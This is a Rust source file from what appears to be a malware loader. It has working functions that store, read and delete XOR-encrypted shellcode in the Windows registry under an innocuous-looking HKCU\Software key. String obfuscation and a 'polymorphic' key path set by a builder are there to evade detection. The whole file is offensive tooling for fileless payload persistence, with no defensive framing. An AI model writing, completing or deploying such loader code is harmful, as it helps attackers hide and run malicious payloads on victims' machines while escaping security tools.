//! Registry module for the loader
//!
//! Reads XOR-encrypted shellcode from Windows Registry.
//! The registry key path is polymorphic and patched by the builder.

#[allow(unused_imports)]
use crate::config;

/// Read encrypted shellcode from registry
/// Registry path: HKCU\Software\<legit-looking-name>
/// Value name: Configured via config module
#[cfg(target_os = "windows")]
pub fn read_shellcode_from_registry() -> Result<Vec<u8>, String> {
    use obfstr::obfstr;
    use std::ptr;
    use winapi::shared::minwindef::DWORD;
    use winapi::um::winreg::{RegCloseKey, RegOpenKeyExA, RegQueryValueExA, HKEY_CURRENT_USER};

    let reg_key_name = config::get_registry_key();
    let reg_value_name = config::get_registry_value();

    // Build full registry path: Software\<key_name>
    let software_path = obfstr!("Software\\").to_string();
    let full_path = format!("{}{}\0", software_path, reg_key_name);
    let value_name_cstr = format!("{}\0", reg_value_name);

    unsafe {
        let mut hkey: winapi::shared::minwindef::HKEY = ptr::null_mut();

        // Open registry key
        // KEY_READ = 0x20019
        let result = RegOpenKeyExA(
            HKEY_CURRENT_USER,
            full_path.as_ptr() as *const i8,
            0,
            0x20019, // KEY_READ
            &mut hkey,
        );

        if result != 0 {
            return Err(format!("Failed to open registry key: {}", result));
        }

        // Query value size first
        let mut data_type: DWORD = 0;
        let mut data_size: DWORD = 0;

        let result = RegQueryValueExA(
            hkey,
            value_name_cstr.as_ptr() as *const i8,
            ptr::null_mut(),
            &mut data_type,
            ptr::null_mut(),
            &mut data_size,
        );

        if result != 0 {
            RegCloseKey(hkey);
            return Err(format!("Failed to query value size: {}", result));
        }

        // Allocate buffer and read data
        let mut data: Vec<u8> = vec![0u8; data_size as usize];

        let result = RegQueryValueExA(
            hkey,
            value_name_cstr.as_ptr() as *const i8,
            ptr::null_mut(),
            &mut data_type,
            data.as_mut_ptr(),
            &mut data_size,
        );

        RegCloseKey(hkey);

        if result != 0 {
            return Err(format!("Failed to read value: {}", result));
        }

        // Trim to actual size
        data.truncate(data_size as usize);

        Ok(data)
    }
}

#[cfg(not(target_os = "windows"))]
pub fn read_shellcode_from_registry() -> Result<Vec<u8>, String> {
    Err("Registry operations only supported on Windows".to_string())
}

/// Write encrypted shellcode to registry
/// Used by the builder/deployment tool
#[cfg(target_os = "windows")]
pub fn write_shellcode_to_registry(
    key_name: &str,
    value_name: &str,
    data: &[u8],
) -> Result<(), String> {
    use obfstr::obfstr;
    use std::ptr;
    use winapi::shared::minwindef::DWORD;
    use winapi::um::winnt::REG_BINARY;
    use winapi::um::winreg::{
        RegCloseKey, RegCreateKeyExA, RegSetValueExA, HKEY_CURRENT_USER, REG_OPTION_NON_VOLATILE,
    };

    // Build full registry path: Software\<key_name>
    let software_path = obfstr!("Software\\").to_string();
    let full_path = format!("{}{}\0", software_path, key_name);
    let value_name_cstr = format!("{}\0", value_name);

    unsafe {
        let mut hkey: winapi::shared::minwindef::HKEY = ptr::null_mut();
        let mut disposition: DWORD = 0;

        // Create or open registry key
        // KEY_WRITE = 0x20006
        let result = RegCreateKeyExA(
            HKEY_CURRENT_USER,
            full_path.as_ptr() as *const i8,
            0,
            ptr::null_mut(),
            REG_OPTION_NON_VOLATILE,
            0x20006, // KEY_WRITE
            ptr::null_mut(),
            &mut hkey,
            &mut disposition,
        );

        if result != 0 {
            return Err(format!("Failed to create registry key: {}", result));
        }

        // Set value
        let result = RegSetValueExA(
            hkey,
            value_name_cstr.as_ptr() as *const i8,
            0,
            REG_BINARY,
            data.as_ptr(),
            data.len() as DWORD,
        );

        RegCloseKey(hkey);

        if result != 0 {
            return Err(format!("Failed to set registry value: {}", result));
        }

        Ok(())
    }
}

#[cfg(not(target_os = "windows"))]
pub fn write_shellcode_to_registry(
    _key_name: &str,
    _value_name: &str,
    _data: &[u8],
) -> Result<(), String> {
    Err("Registry operations only supported on Windows".to_string())
}

/// Delete shellcode from registry (cleanup)
#[cfg(target_os = "windows")]
pub fn delete_shellcode_from_registry(key_name: &str) -> Result<(), String> {
    use obfstr::obfstr;
    use winapi::um::winreg::{RegDeleteKeyA, HKEY_CURRENT_USER};

    let software_path = obfstr!("Software\\").to_string();
    let full_path = format!("{}{}\0", software_path, key_name);

    unsafe {
        let result = RegDeleteKeyA(HKEY_CURRENT_USER, full_path.as_ptr() as *const i8);

        if result != 0 {
            return Err(format!("Failed to delete registry key: {}", result));
        }

        Ok(())
    }
}

#[cfg(not(target_os = "windows"))]
pub fn delete_shellcode_from_registry(_key_name: &str) -> Result<(), String> {
    Err("Registry operations only supported on Windows".to_string())
}
